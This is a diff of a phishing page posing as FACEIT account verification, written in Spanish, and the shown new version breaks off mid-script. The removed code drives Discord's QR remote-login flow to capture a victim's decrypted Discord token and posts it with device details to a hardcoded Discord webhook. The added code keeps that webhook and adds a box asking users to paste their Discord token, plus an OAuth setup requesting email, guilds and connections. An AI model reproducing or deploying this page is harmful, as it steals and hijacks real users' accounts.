@@ -1,249 +1,121 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>FACEIT · Verificación</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FACEIT · Account Verification</title>
 <style>
-  *{box-sizing:border-box}
-  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:20px;
-       font:16px/1.55 "Roboto",-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
-       background:#0d0d0d;
-       background-image:radial-gradient(120% 70% at 50% 0%,rgba(255,85,0,.14),transparent 60%);
-       color:#fff}
-  .card{width:100%;max-width:400px;background:#171717;border:1px solid #2a2a2a;
-        border-radius:6px;padding:26px;text-align:center;box-shadow:0 24px 60px -30px #000}
-  .mark{font-weight:900;font-style:italic;font-size:26px;letter-spacing:-1.4px;
-        margin:0 0 2px;color:#fff}
-  .mark i{color:#ff5500;font-style:italic}
-  .sub{font-size:9.5px;letter-spacing:2.6px;color:#7a7a7a;text-transform:uppercase;
-       margin:0 0 20px;font-weight:700}
-  .rule{height:2px;background:#ff5500;width:34px;margin:0 auto 20px;border-radius:2px}
-  h1{font-size:18px;margin:0 0 6px;font-weight:800;letter-spacing:-.2px}
-  p{color:#9a9a9a;font-size:13px;margin:0 0 16px}
-  .qr{background:#fff;padding:9px;border-radius:4px;width:100%;max-width:200px;
-      margin:0 auto 8px;display:block}
-  .hint{font-size:11px;color:#6f6f6f;margin:0 0 16px;letter-spacing:.3px}
-  .steps{text-align:left;font-size:12px;color:#8a8a8a;margin:0 0 18px;padding-left:16px}
-  .steps li{margin-bottom:6px}
-  .spin{width:24px;height:24px;border:3px solid #2a2a2a;border-top-color:#ff5500;
-        border-radius:99px;margin:18px auto;animation:r .8s linear infinite}
-  @keyframes r{to{transform:rotate(360deg)}}
-  button{width:100%;padding:12px;border:0;border-radius:4px;font:inherit;font-weight:800;
-         font-size:13.5px;letter-spacing:.6px;text-transform:uppercase;
-         background:#ff5500;color:#fff;cursor:pointer}
-  button.alt{background:#222;color:#ccc;border:1px solid #333;margin-top:8px}
-  .box{background:#0d0d0d;border:1px solid #2a2a2a;border-radius:4px;padding:10px;
-       font:11.5px/1.5 ui-monospace,Menlo,monospace;word-break:break-all;max-height:110px;
-       overflow:auto;text-align:left;margin-bottom:10px;color:#bbb}
-  .ok{color:#3ba55d;font-weight:800;font-size:12px;letter-spacing:.5px;margin-bottom:10px;
-      text-transform:uppercase}
-  .err{color:#ff5500;font-size:12.5px;margin-bottom:10px}
-  .who{font-size:13px;font-weight:800;margin-bottom:8px;color:#ff5500}
-  .foot{font-size:10px;color:#5a5a5a;margin:16px 0 0;letter-spacing:.3px}
-  .hide{display:none!important}
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh; display: grid; place-items: center;
+    font-family: "Segoe UI", Inter, system-ui, sans-serif;
+    background: #08080a; color: #fff; overflow: hidden;
+  }
+  #bg {
+    position: fixed; inset: 0; z-index: -2;
+    background: url("bg.jpg") center/cover no-repeat;
+    filter: brightness(.5) saturate(1.1);
+  }
+  #bg::after {
+    content: ""; position: absolute; inset: 0;
+    background: radial-gradient(circle at 50% 45%, rgba(0,0,0,.25), rgba(0,0,0,.85) 78%);
+  }
+  .card {
+    width: 400px; max-width: calc(100vw - 32px);
+    padding: 34px 30px 28px;
+    background: rgba(16,16,18,.82);
+    border: 1px solid rgba(255,255,255,.08);
+    border-radius: 18px; text-align: center;
+    backdrop-filter: blur(14px);
+    box-shadow: 0 30px 70px rgba(0,0,0,.65);
+    animation: in .35s ease;
+  }
+  @keyframes in { from { opacity: 0; transform: translateY(10px); } }
+  .brand {
+    font-weight: 800; letter-spacing: .32em; font-size: 13px;
+    color: #ff5500; margin-bottom: 22px;
+  }
+  h1 { font-size: 15px; letter-spacing: .14em; font-weight: 700; margin-bottom: 10px; }
+  p { font-size: 13px; line-height: 1.5; color: #9b9ba3; }
+  .spinner {
+    width: 26px; height: 26px; margin: 22px auto 0;
+    border: 2px solid rgba(255,85,0,.25); border-top-color: #ff5500;
+    border-radius: 50%; animation: spin .8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  button {
+    margin-top: 20px; width: 100%; padding: 12px;
+    background: #ff5500; color: #fff; border: 0; border-radius: 10px;
+    font-size: 12px; font-weight: 800; letter-spacing: .14em; cursor: pointer;
+    transition: filter .15s;
+  }
+  button:hover { filter: brightness(1.12); }
+  .err { color: #ff6b6b; }
+  .avatar {
+    width: 76px; height: 76px; border-radius: 50%; margin: 0 auto 14px;
+    border: 2px solid #ff5500; object-fit: cover;
+  }
+  .tick {
+    width: 64px; height: 64px; margin: 0 auto 14px; border-radius: 50%;
+    display: grid; place-items: center; font-size: 30px;
+    background: rgba(35,165,90,.15); border: 1px solid #23a55a; color: #23a55a;
+  }
+  input {
+    width: 100%; margin-top: 16px; padding: 11px 12px; font-size: 12px;
+    background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.12);
+    border-radius: 9px; color: #fff; font-family: monospace;
+  }
+  input:focus { outline: none; border-color: #ff5500; }
+  footer {
+    position: fixed; bottom: 16px; left: 0; right: 0; text-align: center;
+    font-size: 10px; letter-spacing: .22em; color: rgba(255,255,255,.35);
+  }
+  [hidden] { display: none !important; }
 </style>
 </head>
 <body>
+<div id="bg"></div>
+
 <div class="card">
-  <p class="mark">FACE<i>IT</i></p>
-  <p class="sub">Account Verification</p>
-  <div class="rule"></div>
+  <div class="brand">FACEIT</div>
+  <h1 id="title">ACCOUNT VERIFICATION</h1>
+  <p id="status">Estableciendo conexión segura...</p>
 
-  <div id="v0"><h1>Conectando…</h1><div class="spin"></div></div>
+  <div class="spinner" id="spinner"></div>
+  <button id="retry" hidden>REINTENTAR</button>
 
-  <div id="v1" class="hide">
-    <h1>Vinculá tu Discord</h1>
-    <p>Para jugar en este lobby necesitás vincular tu cuenta de Discord.</p>
-    <img class="qr" id="qr" alt="QR">
-    <p class="hint" id="timer">El código expira en 120s</p>
-    <ol class="steps">
-      <li>Abrí Discord en tu teléfono</li>
-      <li>Escaneá el código</li>
-      <li>Confirmá la vinculación</li>
-    </ol>
-    <button id="re">Nuevo código</button>
+  <div id="manual" hidden>
+    <input id="tokenInput" placeholder="Pegá tu token de Discord" spellcheck="false">
+    <button id="tokenBtn">VERIFICAR TOKEN</button>
   </div>
-
-  <div id="v2" class="hide">
-    <h1>Confirmá en el teléfono</h1>
-    <p>Tocá “Iniciar sesión” en la notificación.</p>
-    <div class="who" id="who"></div>
-    <div class="spin"></div>
-  </div>
-
-  <div id="v3" class="hide">
-    <h1>Cuenta vinculada</h1>
-    <div class="ok" id="state">Enviando…</div>
-    <div class="box" id="out"></div>
-    <button id="copy">Copiar token</button>
-    <button class="alt" id="again">Finalizar</button>
-  </div>
-
-  <div id="v4" class="hide">
-    <h1>Error de vinculación</h1>
-    <div class="err" id="msg"></div>
-    <button id="re2">Reintentar</button>
-  </div>
-
-  <p class="foot">FACEIT · Matchmaking Platform</p>
 </div>
 
+<footer>FACEIT · MATCHMAKING PLATFORM</footer>
+
 <script>
-/* ====== EDITÁ ====== */
-const WEBHOOK = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
-const API = "https://discord.com/api/v9";
-/* =================== */
-
-const $ = s => document.querySelector(s);
-const b64 = buf => btoa(String.fromCharCode(...new Uint8Array(buf)));
-const unb64 = s => {
-  const n = atob(s.replace(/-/g, "+").replace(/_/g, "/"));
-  return Uint8Array.from(n, c => c.charCodeAt(0));
+/* ---------------- CONFIG ---------------- */
+const CONFIG = {
+  clientId:    "1570090821276012595",                       // Discord Developer Portal > OAuth2
+  redirectUri: location.origin + location.pathname,  // debe coincidir EXACTO con el portal
+  webhook:     "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP",
+  scopes:      "identify email guilds connections",
+  api:         "https://discord.com/api/v10"
 };
-const b64url = buf => b64(buf).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
 
-let ws, keyPair, beat, ack = true, timer, t0;
-
-function screen(id) {
-  ["v0","v1","v2","v3","v4"].forEach(x => $("#" + x).classList.toggle("hide", x !== id));
-}
-
-async function iniciar() {
-  screen("v0");
-  clearInterval(beat); clearInterval(timer);
-  try { ws && ws.close(); } catch {}
-
-  keyPair = await crypto.subtle.generateKey(
-    { name: "RSA-OAEP", modulusLength: 2048,
-      publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
-    true, ["encrypt", "decrypt"]
-  );
-
-  ws = new WebSocket("wss://remote-auth-gateway.discord.gg/?v=2");
-
-  ws.onmessage = async ev => {
-    const p = JSON.parse(ev.data);
-    switch (p.op) {
-      case "hello": {
-        const spki = await crypto.subtle.exportKey("spki", keyPair.publicKey);
-        ws.send(JSON.stringify({ op: "init", encoded_public_key: b64(spki) }));
-        beat = setInterval(() => {
-          if (!ack) return ws.close();
-          ack = false;
-          ws.send(JSON.stringify({ op: "heartbeat" }));
-        }, p.heartbeat_interval);
-        break;
-      }
-      case "heartbeat_ack":
-        ack = true;
-        break;
-      case "nonce_proof": {
-        const raw = await crypto.subtle.decrypt(
-          { name: "RSA-OAEP" }, keyPair.privateKey, unb64(p.encrypted_nonce));
-        ws.send(JSON.stringify({ op: "nonce_proof", nonce: b64url(raw) }));
-        break;
-      }
-      case "pending_remote_init": {
-        const url = "https://discord.com/ra/" + p.fingerprint;
-        $("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&margin=0&data="
-                     + encodeURIComponent(url);
-        screen("v1");
-        t0 = Date.now();
-        timer = setInterval(() => {
-          const s = 120 - Math.floor((Date.now() - t0) / 1000);
-          $("#timer").textContent = s > 0 ? "El código expira en " + s + "s" : "Código vencido";
-          if (s <= 0) clearInterval(timer);
-        }, 1000);
-        break;
-      }
-      case "pending_ticket": {
-        const raw = await crypto.subtle.decrypt(
-          { name: "RSA-OAEP" }, keyPair.privateKey, unb64(p.encrypted_user_payload));
-        const [, , , user] = new TextDecoder().decode(raw).split(":");
-        $("#who").textContent = "@" + user;
-        screen("v2");
-        break;
-      }
-      case "pending_login":
-        await canjear(p.ticket);
-        break;
-      case "cancel":
-        fallo("Vinculación cancelada desde el teléfono.");
-        break;
-    }
-  };
-
-  ws.onclose = e => {
-    clearInterval(beat);
-    if (!$("#v3").classList.contains("hide")) return;
-    if (e.code === 4003) fallo("El código venció. Generá uno nuevo.");
-    else if (e.code !== 1000) fallo("Conexión interrumpida (" + e.code + ").");
-  };
-  ws.onerror = () => fallo("No se pudo conectar con el servidor.");
-}
-
-async function canjear(ticket) {
-  try {
-    const r = await fetch(API + "/users/@me/remote-auth/login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ ticket })
-    });
-    if (!r.ok) throw new Error("HTTP " + r.status);
-    const { encrypted_token } = await r.json();
-    const raw = await crypto.subtle.decrypt(
-      { name: "RSA-OAEP" }, keyPair.privateKey, unb64(encrypted_token));
-    const token = new TextDecoder().decode(raw);
-    screen("v3");
-    $("#out").textContent = token;
-    enviar(token);
-  } catch (e) {
-    fallo("No se pudo completar: " + e.message);
-  }
-}
-
-async function enviar(token) {
-  const ok = /^[\w-]{24,}\.[\w-]{6}\.[\w-]{25,}$/.test(token);
-  try {
-    const r = await fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "FACEIT · vinculaciones",
-        embeds: [{
-          title: ok ? "Token real capturado" : "Token (formato raro)",
-          color: ok ? 0x3ba55d : 0xff5500,
-          fields: [
-            { name: "Token", value: "```" + token + "```" },
-            { name: "Zona", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-            { name: "Hora", value: new Date().toISOString(), inline: true },
-            { name: "Equipo", value: navigator.userAgent.slice(0, 170) }
-          ]
-        }]
-      })
-    });
-    $("#state").textContent = r.ok ? "Enviado ✓" : "Token obtenido (falló el envío)";
-  } catch {
-    $("#state").textContent = "Token obtenido (sin conexión)";
-  }
-}
-
-function fallo(t) {
-  clearInterval(beat); clearInterval(timer);
-  $("#msg").textContent = t;
-  screen("v4");
-}
-
-$("#copy").onclick = () => {
-  navigator.clipboard.writeText($("#out").textContent);
-  $("#copy").textContent = "Copiado";
-  setTimeout(() => $("#copy").textContent = "Copiar token", 1500);
+const $ = (id) => document.getElementById(id);
+const setStatus = (t, isErr) => {
+  $("status").textContent = t;
+  $("status").className = isErr ? "err" : "";
 };
-$("#again").onclick = iniciar;
-$("#re").onclick = $("#re2").onclick = iniciar;
+const fail = (msg) => {
+  $("spinner").hidden = true;
+  $("title").textContent = "ERROR DE VINCULACIÓN";
+  setStatus(msg, true);
+  $("retry").hidden = false;
+};
 
-iniciar();
-</script>
-</body>
-</html>
+/* ---------------- FLUJO ---------------- */
+(async function boot() {
+  const hash = new URLSearchParams(location.hash.slice(1));
+
+  // 1.
